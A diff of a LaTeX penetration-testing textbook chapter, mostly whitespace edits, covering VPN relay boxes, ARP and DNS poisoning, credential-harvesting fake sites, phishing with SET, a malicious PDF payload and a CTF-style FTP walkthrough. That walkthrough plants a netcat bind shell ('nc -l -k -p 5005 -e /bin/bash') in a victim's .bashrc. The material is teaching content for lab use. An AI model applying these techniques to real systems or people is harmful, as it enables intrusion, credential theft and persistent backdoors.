+		Furthermore, if those machines can have their address altered, you are able to keep up your attack indefinitely.
 
 		Thus, the concept of Operational Relay Boxes comes into play.
-		These are machines which you either own or have gained access to which are outside your network. 
-		They can be used in the same way as a pivot point in the network, described above, or they can be setup specifically, as this section will describe. 
+		These are machines which you either own or have gained access to which are outside your network.
+		They can be used in the same way as a pivot point in the network, described above, or they can be setup specifically, as this section will describe.
 
 		\index{VPN} \index{OpenVPN}
-		The easiest way to set this up is to use a VPN. 
+		The easiest way to set this up is to use a VPN.
 		It will use the OpenVPN server and client, for the Kali attack machine\footnote{\url{https://openvpn.net/index.php/open-source/documentation}}.
-		You will need both ``openvpn'' and ``easy-rsa'' on the server, and ``openvpn'' only on the client (attack machine)\footnote{\url{https://wiki.archlinux.org/index.php/Openvpn}}. 
-		
+		You will need both ``openvpn'' and ``easy-rsa'' on the server, and ``openvpn'' only on the client (attack machine)\footnote{\url{https://wiki.archlinux.org/index.php/Openvpn}}.
+
 		The first step is to set up public key infrastructure (see chapter \ref{ch:Cryptography}).
 		This is done using the easy-rsa scripts with the following commands\footnote{\url{https://wiki.archlinux.org/index.php/Easy-rsa}}:
 			\begin{lstlisting}[style=CLI]
@@ -364,275 +366,275 @@
 				# ./build-key <client name>
 				# openvpn --genkey --secret keys/ta.key
 			\end{lstlisting}
-		This will place the keys you will require for the next stage in the ``keys'' folder. 
-		You should then move ``client.crt'', ``client.key'' and ``ta.key'' to the client. 
+		This will place the keys you will require for the next stage in the ``keys'' folder.
+		You should then move ``client.crt'', ``client.key'' and ``ta.key'' to the client.
 
-		The client and server should now be set up. 
+		The client and server should now be set up.
 		The server config, found in ``/etc/openvpn/server.conf'' should be as follows:
 		\lstinputlisting[numbers=none]{./shellOut/vpnServer.conf}
 		Client config:
 		\lstinputlisting[numbers=none]{./shellOut/vpnClient.conf}
-		Finally, set up nat at the entrance to the VPN using the following command. 
+		Finally, set up nat at the entrance to the VPN using the following command.
 			\begin{lstlisting}[style=CLI]
 				# iptables -t nat -A POSTROUTING -s <VPN ip range> -o eth0 -j MASQUERADE
 			\end{lstlisting}
 
-		This will pass all of your traffic through the server, giving you access to the Internet from it's address. 
-		Generally, this makes it harder for someone defending a network to identify you. 
-		However, this does not mean that there is no way to identify you. 
-		Simply that blocking your address will not directly block you. 
+		This will pass all of your traffic through the server, giving you access to the Internet from it's address.
+		Generally, this makes it harder for someone defending a network to identify you.
+		However, this does not mean that there is no way to identify you.
+		Simply that blocking your address will not directly block you.
 
 	\section{ARP Attacks}
 	\index{ARP}
-		ARP, or the Address Resolution Protocol resides on layer three of the OSI Model. 
-		This protocol is used to translate layer 3 IP addresses into layer 2 MAC addresses using a table stored within the switch. 
-		This table must be updated when new devices enter the network, as well as when they leave. 
-		Thus, ARP tables have a set timeout, causing the data to be removed after that time. 
-		ARP attacks use this table as a means to gain access to traffic that was not destined for them. 
+		ARP, or the Address Resolution Protocol resides on layer three of the OSI Model.
+		This protocol is used to translate layer 3 IP addresses into layer 2 MAC addresses using a table stored within the switch.
+		This table must be updated when new devices enter the network, as well as when they leave.
+		Thus, ARP tables have a set timeout, causing the data to be removed after that time.
+		ARP attacks use this table as a means to gain access to traffic that was not destined for them.
 
-		ARP poisoning is the sending of unsolicited and forged ARP messages. 
-		These will usually contain the IP address of a network resource such as the default gateway or a local server. 
-		This means that all traffic sent to that gateway will be transmitted through the poisoning machine. 
-		This is due to the fact that network devices are designed to overwrite the old data within their ARP tables with new entries. 
-		Thus, any ARP packet sent could result in the destination computer being poisoned. 
+		ARP poisoning is the sending of unsolicited and forged ARP messages.
+		These will usually contain the IP address of a network resource such as the default gateway or a local server.
+		This means that all traffic sent to that gateway will be transmitted through the poisoning machine.
+		This is due to the fact that network devices are designed to overwrite the old data within their ARP tables with new entries.
+		Thus, any ARP packet sent could result in the destination computer being poisoned.
 
-		At this point, the attacker is now a man in the middle, able to perform any action they desire on the data being sent to or from the machine. 
-		For example, this could be used to insert BeEF hooks (See chapter /ref{ch:WebPenetration}) into an insecure page or to DoS attack the system by dropping all to the network resource targeted. 
+		At this point, the attacker is now a man in the middle, able to perform any action they desire on the data being sent to or from the machine.
+		For example, this could be used to insert BeEF hooks (See chapter /ref{ch:WebPenetration}) into an insecure page or to DoS attack the system by dropping all to the network resource targeted.
 
 		\index{Ettercap}
-		The main tool used for this attack is ``Ettercap''. 
+		The main tool used for this attack is ``Ettercap''.
 		\index{Man in the Middle}
-		This tool provides a suite of tools for ``Man in the Middle'' (MitM) attacks. 
-		Furthermore, it will filter content on the fly, giving you only useful data. 
+		This tool provides a suite of tools for ``Man in the Middle'' (MitM) attacks.
+		Furthermore, it will filter content on the fly, giving you only useful data.
 
-		The following is a short guide to using Ettercap for ARP poisoning. 
+		The following is a short guide to using Ettercap for ARP poisoning.
 		\begin{enumerate}
-			\item Open Ettercap and ensure  it is set to promiscuous mode under options. 
-			\item From the Sniff menu, select ``Unified Sniffing''. 
-			\item Select the NIC attached to the network you wish to attack. 
-			\item Under hosts, select scan for hosts. 
-			\item View the hosts list and choose your targets. 
-			\item Ensure that sniffing has started by selecting Start -> Start Sniffing. 
-			\item All data sent between the targets will be intercepted and filtered. 
-				You will be shown relevant data. 
+			\item Open Ettercap and ensure  it is set to promiscuous mode under options.
+			\item From the Sniff menu, select ``Unified Sniffing''.
+			\item Select the NIC attached to the network you wish to attack.
+			\item Under hosts, select scan for hosts.
+			\item View the hosts list and choose your targets.
+			\item Ensure that sniffing has started by selecting Start -> Start Sniffing.
+			\item All data sent between the targets will be intercepted and filtered.
+				You will be shown relevant data.
 		\end{enumerate}
-		This however, is just the start of a useful session with Ettercap. 
-		Once you have found a session, you can insert data to be sent. 
-		On a simple level, this could be done do an admin using a telnet session to inform them that you have gotten access or to run commands on their server. 
-		However, you could also use this to insert a script into a page they are downloading, hooking them with BeEF and gaining access to their computer. 
+		This however, is just the start of a useful session with Ettercap.
+		Once you have found a session, you can insert data to be sent.
+		On a simple level, this could be done do an admin using a telnet session to inform them that you have gotten access or to run commands on their server.
+		However, you could also use this to insert a script into a page they are downloading, hooking them with BeEF and gaining access to their computer.
 
-		Thus, Ettercap and ARP poisoning are exceptionally useful tools within a switched network, 
-		giving you the power to run MitM attacks and capture any traffic. 
+		Thus, Ettercap and ARP poisoning are exceptionally useful tools within a switched network,
+		giving you the power to run MitM attacks and capture any traffic.
 		However, there are some constraints:
 		\begin{itemize}
-			\item While this attack will pick up encrypted traffic, it will not be able to read it. 
-				Further work would have to occur before you would be able to capture the transmitted keys. 
-			\item This will not work on a network that is not switched. 
-			\item While these attacks are hard to find, many of the uses of them will be immediately obvious. 
-				Inserting a message into a telnet session is a good example of this. 
-			\item This type of attack can be found in the ARP poisoning stage by numerous tools such as 
+			\item While this attack will pick up encrypted traffic, it will not be able to read it.
+				Further work would have to occur before you would be able to capture the transmitted keys.
+			\item This will not work on a network that is not switched.
+			\item While these attacks are hard to find, many of the uses of them will be immediately obvious.
+				Inserting a message into a telnet session is a good example of this.
+			\item This type of attack can be found in the ARP poisoning stage by numerous tools such as
 				AntiARP (Windows), ARPStar (Linux) or Dynamic ARP Inspection (Cisco Switches)
 		\end{itemize}
 	\section{DNS Attacks}
-		DNS, as you saw in Chapter \ref{ch:NetworkOperations} is the backbone of the Internet. 
-		Without it, most of what we know on the Internet would be quite dead as the machines would have no way of updating addresses and humans would have no remember ever changing IP addresses. 
+		DNS, as you saw in Chapter \ref{ch:NetworkOperations} is the backbone of the Internet.
+		Without it, most of what we know on the Internet would be quite dead as the machines would have no way of updating addresses and humans would have no remember ever changing IP addresses.
 		However, DNS is also the Holy Grail of server enumeration and Man-in-the-Middle (MitM).
-		This is because it contains the information that maps Domain names to the IP addresses needed to communicate with them. 
+		This is because it contains the information that maps Domain names to the IP addresses needed to communicate with them.
 
-		This section will first discuss the act of DNS enumeration through either zone transfer or brute force. 
-		It will then explain the process of DNS poisoning in order to conduct a MitM attack. 
+		This section will first discuss the act of DNS enumeration through either zone transfer or brute force.
+		It will then explain the process of DNS poisoning in order to conduct a MitM attack.
 
 		\subsection{DNS Enumeration}
 		\index{DNS Enumeration}
-			DNS enumeration gives you access to some or all of the data stored on the DNS server or cache. 
-			This means that you will have a listing of all computers within the DNS zone: your list of targets. 
-			There are two ways of doing this, the easy way and the hard way. 
-			The former requires that the server that you are targeting was misconfigured, leaving it open to zone transfer. 
-			The latter must be done using brute force DNS enumeration, which can take numerous hours. 
+			DNS enumeration gives you access to some or all of the data stored on the DNS server or cache.
+			This means that you will have a listing of all computers within the DNS zone: your list of targets.
+			There are two ways of doing this, the easy way and the hard way.
+			The former requires that the server that you are targeting was misconfigured, leaving it open to zone transfer.
+			The latter must be done using brute force DNS enumeration, which can take numerous hours.
 
 			\subsubsection{DNS Zone Transfer}
 			\index{DNS Zone Transfer}
-				DNS zone transfer is the act of gaining access to the internal DNS servers of an organisation. 
-				It's original use was to allow a slave name server to request a master copy of a particular zone's information from the master server. 
-				However, this can be subverted to get the server to enumerate the whole network to anyone if it is misconfigured. 
-				There are a number of name servers\footnote{\url{https://digi.ninja/projects/zonetransferme.php}} which are vulnerable to this. 
-				An example of such a zone transfer can be found by running the following command. 
+				DNS zone transfer is the act of gaining access to the internal DNS servers of an organisation.
+				It's original use was to allow a slave name server to request a master copy of a particular zone's information from the master server.
+				However, this can be subverted to get the server to enumerate the whole network to anyone if it is misconfigured.
+				There are a number of name servers\footnote{\url{https://digi.ninja/projects/zonetransferme.php}} which are vulnerable to this.
+				An example of such a zone transfer can be found by running the following command.
 				\begin{lstlisting}[style=CLI]
 					$ dig axfr @nsztm1.digi.ninja zonetransfer.me
 				\end{lstlisting}
-				The output of this command is left as an exercise for the reader as the output would take multiple pages within this book. 
-				However, this will output all relevant data about the domain that you are targeting. 
-				This is because while you are accessing the name server from outside its internal zone, you are also transferring into it. 
-				Thus, you will receive all information from within this internal zone. 
+				The output of this command is left as an exercise for the reader as the output would take multiple pages within this book.
+				However, this will output all relevant data about the domain that you are targeting.
+				This is because while you are accessing the name server from outside its internal zone, you are also transferring into it.
+				Thus, you will receive all information from within this internal zone.
 
-				On a normal business system, this could be information such as mail servers, VPN hosts or web servers. 
-				However, on particularly bad systems, you will get a list of all hosts connected to the network, allowing you to target any machine within it. 
+				On a normal business system, this could be information such as mail servers, VPN hosts or web servers.
+				However, on particularly bad systems, you will get a list of all hosts connected to the network, allowing you to target any machine within it.
 
-				Furthermore, the names of these systems give you more information for your attack. 
-				If you come across an office or other branch like setup within the network, it is likely that this will come with a location (or that the location could be found through DoXXing, see Chapter \ref{ch:Forensics}). 
-				Using this, and looking up time zones and business hours, you could target this system while no one is looking, 
-				giving you a far better shot of getting in without being noticed. 
+				Furthermore, the names of these systems give you more information for your attack.
+				If you come across an office or other branch like setup within the network, it is likely that this will come with a location (or that the location could be found through DoXXing, see Chapter \ref{ch:Forensics}).
+				Using this, and looking up time zones and business hours, you could target this system while no one is looking,
+				giving you a far better shot of getting in without being noticed.
 			%TODO: Finish zone transfer and this section.
 
 		\subsection{DNS Poisoning}
 		\index{DNS Poisoning}
-			DNS poisoning, similar to ARP Poisoning, is the act of telling other computers on the network that you are someone you aren't in order to gain further access to a system. 
+			DNS poisoning, similar to ARP Poisoning, is the act of telling other computers on the network that you are someone you aren't in order to gain further access to a system.
 			There are two ways of doing this:
 			\begin{enumerate}
 				\item Request Interception.
-				\item Cache Poisoning. 
+				\item Cache Poisoning.
 			\end{enumerate}
-			The former works by using ARP poisoning to steal the requests then responding to them with fake answers. 
-			The latter works after gaining access to an authoritative DNS server or cache. 
+			The former works by using ARP poisoning to steal the requests then responding to them with fake answers.
+			The latter works after gaining access to an authoritative DNS server or cache.
 
 			\subsubsection{DNS Poisoning Through ARP}
-				As explained in the above section on ARP Poisoning, ettercap should be setup to redirect traffic from the target machine bound for the name servers to itself. 
-				You will then need to alter the file found at ``/usr/share/ettercap/etter.dns'' with the data of the names and IP addresses that you would like to poison. 
+				As explained in the above section on ARP Poisoning, ettercap should be setup to redirect traffic from the target machine bound for the name servers to itself.
+				You will then need to alter the file found at ``/usr/share/ettercap/etter.dns'' with the data of the names and IP addresses that you would like to poison.
 				An example of this configuration can be seen below:
 				\lstinputlisting[numbers=none]{./shellOut/etter.dns}
-				You must then enable the ``dns\_spoof'' plugin. 
+				You must then enable the ``dns\_spoof'' plugin.
 
-				Once this has been setup, all DNS queries sent from the target machine will be intercepted and poisoned. 
-				This can be tested by attempting to resolve the poisoned name from the target machine. 
-				You may then go on with the attacks explained in social engineering to steal passwords or attack computers. 
+				Once this has been setup, all DNS queries sent from the target machine will be intercepted and poisoned.
+				This can be tested by attempting to resolve the poisoned name from the target machine.
+				You may then go on with the attacks explained in social engineering to steal passwords or attack computers.
 			\subsubsection{DNS Poisoning Through Server Attacks}
-				The alternative to setting up ARP Poisoning is to attack the server itself. 
-				This section assumes that you have both successfully exploited the name server and found it's configuration. 
-				It also assumes that the name server is running bind9 on a UNIX-like system. 
+				The alternative to setting up ARP Poisoning is to attack the server itself.
+				This section assumes that you have both successfully exploited the name server and found it's configuration.
+				It also assumes that the name server is running bind9 on a UNIX-like system.
 
-				Within the ``options'' section of the servers configuration, there should be a line starting with ``directory''. 
-				This line designates where the servers DNS cache is stored. 
-				Navigate to the cache directory and edit the files within to set them to your specifications. 
+				Within the ``options'' section of the servers configuration, there should be a line starting with ``directory''.
+				This line designates where the servers DNS cache is stored.
+				Navigate to the cache directory and edit the files within to set them to your specifications.
 				An example configuration can be seen below:
 				\lstinputlisting[numbers=none]{./shellOut/bind.conf}
 	\section{Social Engineering}
-		Accessing a computer network need not always be done through targeted attacks on vulnerable software. 
-		Often, targeting the wetware through the far too common PEBKAC error is more fruitful. 
-		Thus, the following sections discuss the different ways of convincing the user to tell you information that they shouldn't. 
-		Sometimes, this will give you direct access to their computer, or that of another part of the organization. 
-		However, it is more than likely that with a large enough spread, you will at least catch one users password being sent to the wrong service. 
+		Accessing a computer network need not always be done through targeted attacks on vulnerable software.
+		Often, targeting the wetware through the far too common PEBKAC error is more fruitful.
+		Thus, the following sections discuss the different ways of convincing the user to tell you information that they shouldn't.
+		Sometimes, this will give you direct access to their computer, or that of another part of the organization.
+		However, it is more than likely that with a large enough spread, you will at least catch one users password being sent to the wrong service.
 
 		\subsection{Fake Websites}
 		\index{Website Spoofing}
 			Fake websites are one of the easiest social engineering attacks available.
-			This is especially so when you have already set up DNS poisoning as shown in the above section. 
+			This is especially so when you have already set up DNS poisoning as shown in the above section.
 
-			Such an attack will allow you to serve a page that looks exactly like the one the user is requesting, but will retain their password for you before sending it off to the legitimate service. 
-			With little effort, this can be done on any site. 
-			However, it takes significantly more to make the site have the correct TLS certificates and encryption. 
-			
+			Such an attack will allow you to serve a page that looks exactly like the one the user is requesting, but will retain their password for you before sending it off to the legitimate service.
+			With little effort, this can be done on any site.
+			However, it takes significantly more to make the site have the correct TLS certificates and encryption.
+
 			\index{Weeman}
-			The tool used to conduct such an attack is ``weeman''. 
-			This tool allows you to scrape a web page from the Internet and serve it from your own machine, capturing any information transmitted to it. 
+			The tool used to conduct such an attack is ``weeman''.
+			This tool allows you to scrape a web page from the Internet and serve it from your own machine, capturing any information transmitted to it.
 
-			To start weeman, run the command ``weeman <site to scrape>''. 
-			This will scrape the site and start a server serving it. 
-			It will also begin reading POST requests, looking for passwords and other information. 
+			To start weeman, run the command ``weeman <site to scrape>''.
+			This will scrape the site and start a server serving it.
+			It will also begin reading POST requests, looking for passwords and other information.
 
-			If you have set this up correctly, browsing to ``localhost'' should show you the fake website. 
-			However, on the targeted machines, browsing to the name of the site you have scraped should send you to weemans fake version. 
+			If you have set this up correctly, browsing to ``localhost'' should show you the fake website.
+			However, on the targeted machines, browsing to the name of the site you have scraped should send you to weemans fake version.
 
-			At this point, weeman should output any usernames or passwords that are sent to it, redirecting those users to the correct site. 
+			At this point, weeman should output any usernames or passwords that are sent to it, redirecting those users to the correct site.
 		\subsection{Social Engineering Toolkit}
 		\index{Social Engineering Toolkit}
-			The Social Engineering Toolkit is an exceptionally malicious tool for generating content that will likely be read by those it is sent to. 
-			It uses a number of Metasploit functions to create its exploits, and relies on their payloads and listeners to ensure that the shell returned is picked up and available. 
+			The Social Engineering Toolkit is an exceptionally malicious tool for generating content that will likely be read by those it is sent to.
+			It uses a number of Metasploit functions to create its exploits, and relies on their payloads and listeners to ensure that the shell returned is picked up and available.
 
 			\index{Email Phishing}
-			This section will walk through sending a malicious email using SET. 
-			However, first, you will need to set up the site which will be doing the attack. 
+			This section will walk through sending a malicious email using SET.
+			However, first, you will need to set up the site which will be doing the attack.
 			This could either be a completely malicious site, or a metasploit ``autoPWN'', as discussed in chapter \ref{ch:WebPenetration}
 
-			From this point, you should open SET using the ``setoolkit'' command. 
-			You should now have the attack menu, from which you should select 1, 5 then 1. 
-			This will take you to the email generator. 
+			From this point, you should open SET using the ``setoolkit'' command.
+			You should now have the attack menu, from which you should select 1, 5 then 1.
+			This will take you to the email generator.
 
-			This generator is similar to the one that you use for your normal email, however it gives you the ability to set different return and sender addresses, and will connect directly to the address that you are trying to send to. 
-			Following the obvious steps will take you to the point that you can create your email, 
-			allowing you to enter the subject and the text that will be sent. 
-			It is at this point that you should enter a convincing argument and the URL that you want the victim to click. 
+			This generator is similar to the one that you use for your normal email, however it gives you the ability to set different return and sender addresses, and will connect directly to the address that you are trying to send to.
+			Following the obvious steps will take you to the point that you can create your email,
+			allowing you to enter the subject and the text that will be sent.
+			It is at this point that you should enter a convincing argument and the URL that you want the victim to click.
 
-			If done correctly, it will be difficult, though not impossible, to track the sender down, while also ginving the target the desired email and URL. 
+			If done correctly, it will be difficult, though not impossible, to track the sender down, while also ginving the target the desired email and URL.
 
 		\subsection{Malicious PDF}
 		\index{Malicious PDF}
 			This section will discuss the creation of a client side exploit, stored in a PDF, through the use of Metasploit\footnote{\url{https://www.offensive-security.com/metasploit-unleashed/client-side-exploits/}}.
-			This is usually used for targeted social engineering attacks, where you know a significant amount about the user in order to ensure they will open the file\cite{MSFU}. 
+			This is usually used for targeted social engineering attacks, where you know a significant amount about the user in order to ensure they will open the file\cite{MSFU}.
 
-			This attack will be completed through the Metasploit Framework, and find an exploit which will work. 
-			For demonstration here, the Adobe Reader ``util.printf()'' vulnerability will be used. 
-			However, you should target your attack to what you know of the system. 
+			This attack will be completed through the Metasploit Framework, and find an exploit which will work.
+			For demonstration here, the Adobe Reader ``util.printf()'' vulnerability will be used.
+			However, you should target your attack to what you know of the system.
 
-			Using this exploit, you will need to set a number of options within Metasploit, such as the file name, payload and connection options. 
-			Once this has been set, the run command will give you the PDF ready to be sent to the target. 
+			Using this exploit, you will need to set a number of options within Metasploit, such as the file name, payload and connection options.
+			Once this has been set, the run command will give you the PDF ready to be sent to the target.
 
-			To properly stage the payload, you will then need to set up a listener. 
-			This should be done using the ``exploit/multi/handler'' exploit and an appropriate payload. 
-			Once this is running, you should send the PDF to the machine that you are targeting. 
+			To properly stage the payload, you will then need to set up a listener.
+			This should be done using the ``exploit/multi/handler'' exploit and an appropriate payload.
+			Once this is running, you should send the PDF to the machine that you are targeting.
 
-			On opening the PDF, a connection should be made between the Metasploit handler and the PDF, giving you Meterpreter access to the machine. 
-			From here, you can migrate to another process and use the machine as your own. 
+			On opening the PDF, a connection should be made between the Metasploit handler and the PDF, giving you Meterpreter access to the machine.
+			From here, you can migrate to another process and use the machine as your own.
 	\section{Challenges}
 	% TODO: https://www.vulnhub.com/
-	% 
+	%
 	\subsection{Unsecured DNS Server}
-		The DNS server at ``ns.cysec'' has a number of known vulnerabilities in it. 
-		It is running a version of bind that is no longer supported. 
-		Target it first using the ``version'' command in a DNS query. 
-		This will give you the information that you will require to search for a vulnerability in it and gain access to the system. 
+		The DNS server at ``ns.cysec'' has a number of known vulnerabilities in it.
+		It is running a version of bind that is no longer supported.
+		Target it first using the ``version'' command in a DNS query.
+		This will give you the information that you will require to search for a vulnerability in it and gain access to the system.
 
 		\subsection{Unsecured FTP to Shell}
 		% Expect tutorial for setting this up. http://web.archive.org/web/20041010121409/http://www.raycosoft.com/rayco/support/expect_tutor.html
-			This section is an initial walk through for getting access to a system with an unsecured FTP server. 
-			This will use a number of tools which are covered in other sections, but is designed as an introduction. 
-			Thus, if you have not used these tools before, do not worry, they will be explained later. 
+			This section is an initial walk through for getting access to a system with an unsecured FTP server.
+			This will use a number of tools which are covered in other sections, but is designed as an introduction.
+			Thus, if you have not used these tools before, do not worry, they will be explained later.
 
-			To do this, the first step is to determine what the computer you are targeting is running. 
+			To do this, the first step is to determine what the computer you are targeting is running.
 			This is done using the tool ``nmap'' as below:
 			\begin{lstlisting}[style=CLI]
 				$ nmap -Sv <Target> -p-
 			\end{lstlisting}
-			This will give us a list of the services which are running on the server, as well as their names and ports. 
+			This will give us a list of the services which are running on the server, as well as their names and ports.
 			We will be looking at the FTP server, as it is currently allowing plain text authentication:
 			\begin{quote}
 				21/tcp    open  ftp         vsftpd 2.3.4
 			\end{quote}
-			Unlike SFTP, the modern protocol, FTP often allows for plain text authentication, meaning that a person intercepting traffic would be able to read the user name and password. 
-			This is how we will begin to gain access to the system. 
+			Unlike SFTP, the modern protocol, FTP often allows for plain text authentication, meaning that a person intercepting traffic would be able to read the user name and password.
+			This is how we will begin to gain access to the system.
 
-			Open the program Wireshark and start a listener on eth1. 
-			This is the NIC that is connected to the remote server and that someone may be interacting with it on. 
-			Usually this would be done through means such as a \href{https://lanturtle.com/}{LAN Turtle}, 
-			However, for the purposes of this demonstration, we will simply be using a local network interface. 
+			Open the program Wireshark and start a listener on eth1.
+			This is the NIC that is connected to the remote server and that someone may be interacting with it on.
+			Usually this would be done through means such as a \href{https://lanturtle.com/}{LAN Turtle},
+			However, for the purposes of this demonstration, we will simply be using a local network interface.
 
-			When the listener is setup, look for a set of TCP and FTP packets to the target from your machine. 
-			These will likely be the FTP authentication, so right click and select ``Follow TCP Stream'' to view the messages that were sent. 
-			At this point you should have the user name and password. 
-			If you do not, find another set of TCP and FTP messages and try again. 
+			When the listener is setup, look for a set of TCP and FTP packets to the target from your machine.
+			These will likely be the FTP authentication, so right click and select ``Follow TCP Stream'' to view the messages that were sent.
+			At this point you should have the user name and password.
+			If you do not, find another set of TCP and FTP messages and try again.
 			For more information on using Wireshark, see it's section in Chapter \ref{ch:Forensics}.
 
 			Now that we can alter files on their system, add the following line to their .bashrc.
-			This will open a listener on port 5005 which can be interacted with from any computer on the network. 
+			This will open a listener on port 5005 which can be interacted with from any computer on the network.
 			\begin{lstlisting}[style=CLI]
 				$ nc -l -k -p 5005 -e /bin/bash
 			\end{lstlisting}
 
 			Using FTP with the user name and password that you found, run the following commands:
 			\begin{verse}
-				get .bashrc 
+				get .bashrc
 			\end{verse}
 			Exit FTP at this point and edit the required line into the .bashrc then run the following FTP command:
 			\begin{quote}
 				put .bashrc
 			\end{quote}
-			This will mean that as soon as the msfadmin user logs into their account, a shell will be opened on port 5005. 
+			This will mean that as soon as the msfadmin user logs into their account, a shell will be opened on port 5005.
 
 			At this point, we can get shell access to the computer using the following command:
 			\begin{lstlisting}[style=CLI]
 				$ ncat <target IP> 5005
 			\end{lstlisting}
-			While you will not see it, this will give you access to a shell, but no prompt. 
-			Try any shell command that you know, most will work. 
-			
-			At this point, navigate to the file at ``/etc/flag'' and tell me the flag that you find. 
-			
+			While you will not see it, this will give you access to a shell, but no prompt.
+			Try any shell command that you know, most will work.
+
+			At this point, navigate to the file at ``/etc/flag'' and tell me the flag that you find.
+
